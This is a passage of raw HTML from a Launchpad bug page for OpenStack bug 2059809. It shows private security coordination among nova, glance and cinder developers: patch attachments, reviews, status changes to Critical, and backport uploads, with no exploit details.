            <time itemprop="commentTime" datetime="2024-04-02T13:19:22.701003+00:00" title="2024-04-02 13:19:22 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761288/+files/glance.patch" class="sprite haspatch-icon">glance.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/2059809/+attachment/5761288">Edit</a>
        
        (1.4 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~arnaud-morin" class="sprite person">Arnaud Morin (arnaud-morin)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T13:19:47.627744+00:00" title="2024-04-02 13:19:47 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2059809/+attachment/5761289/+files/cinder.patch" class="sprite haspatch-icon">cinder.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/2059809/+attachment/5761289">Edit</a>
        
        (3.0 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mkaesberger" class="sprite person">Martin Kaesberger (mkaesberger)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T13:32:34.404954+00:00" title="2024-04-02 13:32:34 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Jeremy Stanley: The reference to the production system the report refers to the fact that it was discovered in the OVHcloud. I reported it to them in private first and was referred here.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Jeremy Stanley: The reference to the production system the report refers to the fact that it was discovered in the OVHcloud. I reported it to them in private first and was referred here.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T13:49:04.455597+00:00" title="2024-04-02 13:49:04 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for confirming. In this case it seems like we should be able to continue working on this in private for now, with added assistance from folks at OVH.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for confirming. In this case it seems like we should be able to continue working on this in private for now, with added assistance from folks at OVH.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-02T15:10:13.072385+00:00" title="2024-04-02 15:10:13 UTC">on 2024-04-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Dan&#x27;s glance-<wbr />2059809.<wbr />patch LGTM.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Dan's glance-2059809.patch LGTM.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
    
    <time title="2024-04-03 12:10:01 UTC" datetime="2024-04-03T12:10:01.843282+00:00">on 2024-04-03</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in cinder: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; In Progress
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Brian Rosmaita (brian-rosmaita)
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in glance: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; In Progress
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>assignee</b>:
      </td>
      <td>
        nobody &#8594; Dan Smith (danms)
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; In Progress
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:39:03.090064+00:00" title="2024-04-03 14:39:03 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Nova backport for 2024.1</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Nova backport for 2024.1</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:39:25.964015+00:00" title="2024-04-03 14:39:25 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Nova backport for 2023.2</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Nova backport for 2023.2</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:39:46.036799+00:00" title="2024-04-03 14:39:46 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Nova backport for 2023.1</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Nova backport for 2023.1</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:39:59.988370+00:00" title="2024-04-03 14:39:59 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Nova backport for zed</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Nova backport for zed</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:43:39.440699+00:00" title="2024-04-03 14:43:39 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Glance backport for 2024.1</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Glance backport for 2024.1</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:44:01.738493+00:00" title="2024-04-03 14:44:01 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Glance backport for 2023.2</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Glance backport for 2023.2</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:44:21.500866+00:00" title="2024-04-03 14:44:21 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Glance backport for 2023.1</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Glance backport for 2023.1</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T14:44:37.279983+00:00" title="2024-04-03 14:44:37 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Glance backport for zed</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Glance backport for zed</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~eharney" class="sprite person">Eric Harney (eharney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T15:38:18.367937+00:00" title="2024-04-03 15:38:18 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>brian-rosmaita&#x27;s cinder-<wbr />2059809.<wbr />patch from comment #16 looks good to me.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">brian-rosmaita's cinder-2059809.patch from comment #16 looks good to me.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T16:06:57.780418+00:00" title="2024-04-03 16:06:57 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Cinder patch for 2024.1 (Caracal)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Cinder patch for 2024.1 (Caracal)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-rosmaita" class="sprite person">Brian Rosmaita (brian-rosmaita)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-04-03T16:08:07.694929+00:00" title="2024-04-03 16:08:07 UTC">on 2024-04-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Cinder patch for 2023.2 (Bobcat).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Cinder patch for 2023.2 (Bobcat).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
